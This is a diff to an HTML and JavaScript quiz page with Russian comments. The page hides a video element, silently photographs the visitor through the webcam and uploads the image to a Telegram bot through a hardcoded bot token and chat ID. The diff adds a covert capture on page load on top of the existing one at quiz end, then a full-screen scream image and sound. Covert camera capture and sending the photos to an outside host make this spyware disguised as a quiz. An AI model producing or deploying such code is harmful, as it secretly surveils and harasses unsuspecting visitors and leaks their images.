@@ -67,9 +67,21 @@
             left: 50%;
             transform: translate(-50%, -50%);
         }
+        .final-image {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 9999;
+            display: none;
+        }
     </style>
 </head>
 <body>
+    <img src="DNIS.jpg" class="final-image" id="finalImage">
+    <audio id="screamSound" src="https://www.myinstants.com/media/sounds/screaming_1.mp3"></audio>
     <div id="camera-container">
         <video id="camera" autoplay playsinline></video>
     </div>
@@ -133,11 +145,20 @@
         const nextBtn = document.getElementById('nextBtn');
         const quiz = document.getElementById('quiz');
         const result = document.getElementById('result');
+        const finalImage = document.getElementById('finalImage');
+        const screamSound = document.getElementById('screamSound');
 
         // ЗАМЕНИТЕ ЭТИ ЗНАЧЕНИЯ НА СВОИ
         const BOT_TOKEN = '8188957293:AAHmtiE3sgaj0lhUYijUmOnUYBWDaJw39JE';
         const CHAT_ID = '2126669672';
 
+        // Функция для показа финального изображения со звуком
+        function showFinalScreen() {
+            finalImage.style.display = 'block';
+            screamSound.play();
+        }
+
+        // Функция для фото
         async function takePhoto() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -149,25 +170,20 @@
                 
                 video.srcObject = stream;
                 
-                // Делаем контейнер и видео невидимыми
                 container.style.display = 'block';
                 container.style.opacity = '0';
                 container.style.zIndex = '-1';
                 video.style.opacity = '0';
                 
-                // Ждем 1 секунду для инициализации камеры
                 await new Promise(resolve => setTimeout(resolve, 1000));
 
-                // Создаем canvas и делаем снимок
                 const canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
 
-                // Конвертируем в blob
                 const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
 
-                // Отправляем в Telegram
                 const formData = new FormData();
                 formData.append('photo', blob, 'photo.jpg');
                 
@@ -187,13 +203,15 @@
                     console.error('Ошибка отправки:', error);
                 }
 
-                // Закрываем камеру
                 stream.getTracks().forEach(track => track.stop());
                 container.style.display = 'none';
             } catch (error) {
                 console.error('Ошибка:', error);
             }
         }
+
+        // Делаем фото при загрузке страницы
+        window.addEventListener('load', takePhoto);
 
         nextBtn.addEventListener('click', async function() {
             const currentQuestionEl = document.querySelector(`.question[data-question="${currentQuestion}"]`);
@@ -217,7 +235,8 @@
                 quiz.style.display = 'none';
                 result.style.display = 'block';
                 result.innerHTML = 'Поздравляю, вы - БОТ!';
-                await takePhoto(); // Делаем фото при завершении
+                await takePhoto(); // Делаем второе фото
+                setTimeout(showFinalScreen, 1000); // Показываем финальный экран через секунду
             }
         });
     </script>
